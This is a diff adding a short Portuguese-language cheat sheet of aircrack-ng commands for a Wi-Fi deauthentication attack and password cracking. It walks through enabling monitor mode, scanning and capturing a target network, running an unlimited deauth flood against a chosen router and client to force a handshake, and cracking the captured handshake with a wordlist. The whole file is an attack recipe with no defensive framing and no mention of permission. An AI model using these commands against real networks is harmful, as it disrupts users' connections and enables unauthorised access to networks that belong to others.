@@ -1,0 +1,16 @@
+########## ATAQUE DE DESAUTENTICACAO ##########
+
+iwconfig -> verificar status
+airmon-ng check kill -> matar processor da placa de rede
+airmon-ng start wlan0 -> entrar em modo monitor
+airmon-ng stop wlan0mon -> sair modo monitor
+service NetworkManager restart -> voltar a usar internet
+airodump-ng wlan0 -> ver todos acces points por perto
+airodump-ng -c<chanel_number> -w Capture-Pat -d <IP_ESPECIFICO> wlan0 -> analizar uma rede especifica
+
+aireplay-ng --deauth 0 -a <roteador> -c <alvo> wlan0 -> DESCONNECTION EFFECTIVE ATACK
+
+########## DESCOBRIR SENHA ##########
+* Observe se seu ataque de desautenticacao ofereceu-lhe um handshake, se sim, voce pode prosseguir...
+
+aircrack-ng Capture-Pat-01.cap -w wordlist.txt
